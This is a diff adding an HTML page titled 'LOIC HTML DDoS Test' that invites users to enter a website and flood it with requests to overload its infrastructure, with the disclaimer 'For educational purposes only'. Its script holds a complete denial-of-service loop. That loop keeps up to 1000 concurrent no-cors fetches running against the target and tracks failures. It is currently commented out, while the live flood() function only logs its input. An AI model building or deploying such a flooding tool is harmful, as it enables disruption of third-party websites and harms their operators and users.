@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>LOIC HTML DDoS Test</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h2 class="title"> DDOS a Website </h2>
+    <ul>
+        <li>
+            <h3>  <b> For educational purposes only obviously </b> </h3>
+            <p class="sub">For security concerns, you are able to simply save the webpage, and run locally - as well as
+                view the source. It is entirely HTML and browser interpreted. <br> Open this page and insert the website, it will flood the site
+                and pose a huge load on their infrastructure given enough people </p>
+
+            <form onSubmit="flood()">
+                <label for="website">Website:</label><br>
+                <input type="text" id="website" name="website"><br>
+                <input type="submit">
+            </form> 
+
+        </li>
+    </ul>
+<!--     
+    <h3 class="desc">Here is the stats of your session (the links and the number of the requests that were sent from
+        your
+        browser:<br>
+        Failed to fetch is normal - if any site has that - that means their servers are under load and are dropping
+        packets - which is the goal!</h3>
+    <div id="stats" class="stats">
+    </div>
+    <div id="errors"></div> -->
+
+    <script>
+        
+        function flood(website) {
+            console.log(website)
+        }
+
+        var statsEl = document.getElementById('stats');
+        function printStats() {
+            statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
+        }
+        setInterval(printStats, 100);
+
+        var CONCURRENCY_LIMIT = 1000
+        var queue = []
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        // async function flood(target) {
+        //     while (true) {
+        //         if (queue.length > CONCURRENCY_LIMIT) {
+        //             await queue.shift()
+        //         }
+        //         queue.push(
+        //             fetchWithTimeout(target, { timeout: 2000 })
+        //                 .catch((error) => {
+        //                     if (error.code === 20 /* ABORT */) {
+        //                         return;
+        //                     }
+        //                     targets[target].number_of_errored_responses++;
+        //                     targets[target].error_message = error.message
+        //                 })
+        //                 .then((response) => {
+        //                     if (response && !response.ok) {
+        //                         targets[target].number_of_errored_responses++;
+        //                         targets[target].error_message = response.statusText
+        //                     }
+        //                     targets[target].number_of_requests++;
+        //                 })
+
+
+        //         )
+        //     }
+        // }
+
+        //Start
+        // Object.keys().map(flood)
+    </script>
+</body>
+</html>
